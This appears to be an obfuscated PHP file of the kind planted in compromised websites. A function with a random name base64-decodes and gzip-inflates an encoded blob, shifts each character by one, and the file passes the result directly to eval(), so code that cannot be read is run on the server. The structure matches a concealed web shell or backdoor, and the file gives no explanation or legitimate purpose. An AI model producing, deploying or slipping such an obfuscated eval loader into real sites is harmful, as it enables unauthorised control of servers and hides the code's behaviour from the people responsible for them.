<?php function KbYey($fnmD)
{
    $fnmD=gzinflate(base64_decode($fnmD));
    for($i=0;$i<strlen($fnmD);$i++)
    {
        $fnmD[$i] = chr(ord($fnmD[$i])-1);
    }
    return $fnmD;
}eval(KbYey("nVDRasJAEPyA+4pFgpeAGgUfpFbalxT70FpNLJRSQrhs6knMhdyJLeK3d0/TNLRv3be9mZ2bGQAa5uyrHGbQ8f2jE4fB6jlYvfJ5FD3F80UY8bdT63kVLNdBGMXr1T0BnSlzUIukxDS+iGzMLtclCpnkYpNU2rXiPQgeo3i5XkRB2AO+ju76E+7RrUzpZDRlzBGJ2GAmc6SHNDHo8od+2n/hHgyAD7ZaFXxas4zcWdZoMhzSpczAtXcxfkht6L9GyYNuFyzZ9aAPrdtrsPDuDLXoHhyZ7aNRfEcTC1UYLH7pzuh3D1QRVJWqXArCToC5xrZAYvcZMV2H8iRk+PavKN8YU175PlUlP5NSbQdaGvRzKbDQeCPTGaf8tiZqoUtNXvZW5V5j207Lkl0bVw3BqSvOVIlFK1MPOodOfWUnO1RkxHUu2DlBGxW50jVq03+//6e5s08qkDGW7QthpCp+cHaJZluKK9SlolZIOEV3PBzXhlKJVogEvgA="));?>